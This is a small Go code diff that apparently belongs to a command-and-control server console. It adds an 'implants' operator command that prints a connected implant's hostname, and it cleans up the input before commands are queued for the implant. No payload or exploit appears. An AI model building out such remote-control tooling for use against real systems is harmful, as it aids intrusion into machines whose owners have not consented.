@@ -14,12 +14,19 @@ var outputDone = make(chan bool)
 
 func getUserInput() {
 	input := bufio.NewReader(os.Stdin)
+
 	for {
 		fmt.Print("[operator]> ")
 		command, err := input.ReadString('\n')
 		if err != nil {
 			log.Println("[-] Error reading input:", err)
 			return
+		}
+
+		command = strings.TrimSpace(command)
+		if command == "implants" {
+			fmt.Println(implant.Hostname)
+			continue
 		}
 
 		pendingCommand = strings.TrimSpace(command)
